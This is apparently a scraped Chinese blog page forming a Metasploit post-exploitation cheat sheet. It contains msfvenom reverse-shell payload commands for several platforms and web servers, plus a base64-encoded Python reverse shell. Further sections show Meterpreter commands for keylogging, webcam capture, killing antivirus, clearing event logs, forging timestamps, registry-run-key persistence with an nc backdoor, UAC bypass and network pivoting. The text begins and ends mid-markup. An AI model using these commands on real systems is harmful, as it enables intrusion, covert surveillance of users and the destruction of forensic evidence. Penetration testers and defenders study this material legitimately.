class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13</span><br><span class="line">SESSION =&gt; 13</span><br><span class="line">msf5 exploit(windows/local/registry_persistence) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Generating payload blob..</span><br><span class="line">[+] Generated payload, 6048 bytes</span><br><span class="line">[*] Root path is HKCU</span><br><span class="line">[*] Installing payload blob..</span><br><span class="line">[+] Created registry key HKCU\Software\0BaG3zDR</span><br><span class="line">[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD</span><br><span class="line">[*] Installing run key</span><br><span class="line">[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB</span><br><span class="line">[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</span><br></pre></td></tr></table></figure>同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence。<h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></li><li><a href="https://www.anquanke.com/post/id/164525">萌新科普 手把手教你如何用MSF进行后渗透测试 - 安全客，安全资讯平台</a></li><li><a href="https://www.freebuf.com/sectool/118714.html">访问的文章审核中… - FreeBuf网络安全行业门户</a>## 1. 安装运行及初始化安装<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall</span><br><span class="line"></span><br><span class="line"># 安装完成后位置</span><br><span class="line"># /opt/metasploit-framework/embedded/framework/</span><br><span class="line"></span><br><span class="line"># 目录结构 </span><br><span class="line">--modules 重点看这里就行了</span><br><span class="line">  --auxiliary 主要包含辅助性脚本(扫描、嗅探、注入、爆破，漏洞挖掘)</span><br><span class="line">  --encoders 主要包含各种编码工具，以便绕过入侵检测和过滤系统</span><br><span class="line">  --exploits 漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统/服务/模块</span><br><span class="line">  --nops 绕过针对溢出攻击滑行字符串的拦截检测</span><br><span class="line">  --payloads 攻击荷载，主要在目标机器执行代码</span><br><span class="line">  --post 此目录放着msf的exploit执行成功后，向目标发送的一些功能性指令，如提权，获取hash等</span><br><span class="line">  --evasion 新增，用来生成免杀payload，类似于集成msfvenom功能</span><br><span class="line">--data 放了meterpreter ，passiveX，vnc，DLLs，等这些工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件</span><br><span class="line">--plugins 这里的模块用户需要load来加载，提供数据库连接插件和各种要用到的插件</span><br><span class="line">--scripts 这个目录下的文件大都是meterpreter这个模块利用的脚本，比如用到migrate来转移到其他进程的指令的源代码就在此</span><br><span class="line">--tools 包含一些有用的脚本和零散的工具</span><br></pre></td></tr></table></figure>启动<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 运行</span><br><span class="line">$ msfconsole</span><br><span class="line"># 初始化数据库</span><br><span class="line">$ msfdb init</span><br><span class="line"># 重建缓存</span><br><span class="line">$ db_rebuild_cache</span><br><span class="line"># 查看数据库连接情况</span><br><span class="line">$ db_status</span><br></pre></td></tr></table></figure><h2 id="2-msf基本命令-3"><a href="#2-msf基本命令-3" class="headerlink" title="2. msf基本命令"></a>2. msf基本命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">show exploits – 查看所有可用的渗透攻击程序代码 </span><br><span class="line">show auxiliary – 查看所有可用的辅助攻击工具 </span><br><span class="line">show options – 查看该模块所有可用选项 </span><br><span class="line">show payloads – 查看该模块适用的所有载荷代码 </span><br><span class="line">show targets – 查看该模块适用的攻击目标类型</span><br><span class="line">search – 根据关键字搜索某模块 </span><br><span class="line">info – 显示某模块的详细信息 </span><br><span class="line">use – 进入使用某渗透攻击模块 </span><br><span class="line">back – 回退 </span><br><span class="line">set/unset – 设置/禁用模块中的某个参数 </span><br><span class="line">setg/unsetg – 设置/禁用适用于所有模块的全局参数 </span><br><span class="line">save – 将当前设置值保存下来，以便下次启动MSF终端时仍可使用</span><br></pre></td></tr></table></figure><h2 id="3-msfvenom生成payload-3"><a href="#3-msfvenom生成payload-3" class="headerlink" title="3 msfvenom生成payload"></a>3 msfvenom生成payload</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)</span><br><span class="line">-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all</span><br><span class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</span><br><span class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</span><br><span class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构</span><br><span class="line">    --platform   &lt;platform&gt;      指定payload的目标平台</span><br><span class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</span><br><span class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</span><br><span class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数</span><br><span class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</span><br><span class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</span><br><span class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">    --payload-options            列举payload的标准选项</span><br><span class="line">-o, --out   &lt;path&gt;               保存payload</span><br><span class="line">-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</span><br><span class="line">    --shellest                   最小化生成payload</span><br><span class="line">-h, --help                       查看帮助选项</span><br><span class="line">    --help-formats               查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>1.可执行程序Linux<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line">正向连接：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>Windows<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>Mac<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br></pre></td></tr></table></figure>执行方式：直接复制可执行程序到目标机器上执行就行了。2.Web PayloadsPHP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>ASP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>JSP<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>WAR<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br></pre></td></tr></table></figure>执行方式：将shell.php放在web目录下，使用浏览器访问，或者使用以下命令执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php shell.php</span><br></pre></td></tr></table></figure>3.脚本shellPython<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>Bash<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>Perl<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>执行方式：复制shell.py中的内容在linux命令行下执行：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;exec(&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zICAgICAgOyAgICBob3N0PSIxOTIuMTY4Ljg4LjEyOCIgICAgICA7ICAgIHBvcnQ9NDQ0NCAgICAgIDsgICAgcz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkgICAgICA7ICAgIHMuY29ubmVjdCgoaG9zdCxwb3J0KSkgICAgICA7ICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKSAgICAgIDsgICAgb3MuZHVwMihzLmZpbGVubygpLDEpICAgICAgOyAgICBvcy5kdXAyKHMuZmlsZW5vKCksMikgICAgICA7ICAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==&#x27;.decode(&#x27;base64&#x27;))&quot;</span><br></pre></td></tr></table></figure>4.shellcode<br>Linux Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>Windows Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure>Mac Based Shellcode<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</span><br></pre></td></tr></table></figure><h2 id="4-Meterpreter基本命令-3"><a href="#4-Meterpreter基本命令-3" class="headerlink" title="4. Meterpreter基本命令"></a>4. Meterpreter基本命令</h2>首先需要先获取meterpreter：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.81.160</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z # -j(计划任务下进行攻击，后台) -z(攻击完成不遇会话交互)</span><br><span class="line">jobs  # 查看后台攻击任务 </span><br><span class="line">kill &lt;id&gt;  # 停止某后台攻击任务 </span><br><span class="line">sessions -l  # (查看会话)</span><br><span class="line">sessions -i 2   # 选择会话</span><br><span class="line">sessions -k 2   # 结束会话</span><br></pre></td></tr></table></figure>如果先获取了cmd，比如利用ms17-010，默认使用的payload返回的就是cmd。这时候我们可以使用<code>sessions-u 2</code>来将cmdshell升级成meterpreter。获取到了meterpreter，就可以进行后渗透了。<h3 id="4-1-基本系统命令-3"><a href="#4-1-基本系统命令-3" class="headerlink" title="4.1 基本系统命令"></a>4.1 基本系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># 会话管理</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">sessions  # 查看会话</span><br><span class="line">sessions -i  # 切换会话</span><br><span class="line">quit  # 关闭当前的会话，返回msf终端</span><br><span class="line"></span><br><span class="line"># 系统设置</span><br><span class="line">sysinfo  # 查看目标机系统信息</span><br><span class="line">idletime  # 查看目标机闲置时间</span><br><span class="line">reboot/shutdown   # 重启/关机</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # 获得控制台权限</span><br><span class="line">irb  # 进入ruby终端</span><br><span class="line"></span><br><span class="line"># 进程迁移</span><br><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line"></span><br><span class="line"># 执行文件</span><br><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br><span class="line"></span><br><span class="line"># 摄像头命令</span><br><span class="line">webcam_list  #查看摄像头列表</span><br><span class="line">webcam_chat  # 查看摄像头接口</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span class="line">webcam_stream   #通过摄像头开启视频</span><br><span class="line"></span><br><span class="line"># uictl开关键盘/鼠标</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br><span class="line"></span><br><span class="line"># 远程桌面/截屏</span><br><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br><span class="line"></span><br><span class="line"># 键盘记录</span><br><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br><span class="line"></span><br><span class="line"># 添加用户，开启远程桌面</span><br><span class="line"># 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span><br><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</span><br><span class="line"></span><br><span class="line"># 关闭防病毒软件</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># 修改注册表</span><br><span class="line">reg –h # 注册表命令帮助</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line">nc -v 192.168.81.162 443  #攻击者连接nc后门</span><br><span class="line"></span><br><span class="line"># 清理日志</span><br><span class="line">clearav  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure><h3 id="4-2-文件系统命令-3"><a href="#4-2-文件系统命令-3" class="headerlink" title="4.2 文件系统命令"></a>4.2 文件系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # 基本命令</span><br><span class="line">search -f *pass* -d C:\\windows # 搜索文件  -h查看帮助</span><br><span class="line">getwd/pwd  # 获取当前目录</span><br><span class="line">getlwd/lpwd   # 操作攻击者主机 查看当前目录</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # 上传文件</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # 下载文件</span><br><span class="line">edit c:\\1.txt  # 编辑或创建文件  没有的话，会新建文件</span><br><span class="line">mkdir lltest2  # 只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  # 只能删除当前目录下文件夹</span><br><span class="line">lcd /tmp   # 操作攻击者主机 切换目录</span><br><span class="line"></span><br><span class="line"># timestomp伪造文件时间戳</span><br><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure><h3 id="4-3-网络命令-3"><a href="#4-3-网络命令-3" class="headerlink" title="4.3 网络命令"></a>4.3 网络命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># 基本</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br><span class="line"></span><br><span class="line"># portfwd端口转发</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加路由</span><br><span class="line"></span><br><span class="line"># 方式一autoroute （deprecated）</span><br><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.2.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br><span class="line"># 方式二post/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络</span><br><span class="line">run post/multi/manage/autoroute CMD=print # 查看添加的路由</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># 然后可以利用arp_scanner、portscan等进行扫描</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autoroute添加完路由后，还可以利用msf自带的模块进行socks代理</span><br><span class="line"># msf提供了2个模块用来做socks代理。</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># 先background退出来，然后：</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080</span><br><span class="line"># 最后proxychains 使用Socks5代理访问</span><br><span class="line"></span><br><span class="line"># sniffer抓包</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure><h3 id="4-4-信息收集-3"><a href="#4-4-信息收集-3" class="headerlink" title="4.4 信息收集"></a>4.4 信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 信息收集的脚本位于：</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># 以下列举一些常用的</span><br><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure><h3 id="4-5-提权-3"><a href="#4-5-提权-3" class="headerlink" title="4.5 提权"></a>4.5 提权</h3>1.getsystem提权<br>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure>2.bypassuac<br>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。msf提供了如下几个模块帮助绕过UAC：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>使用方法类似，运行后返回一个新的会话，<strong>需要再次执行getsystem获取系统权限</strong><figure class="highlight 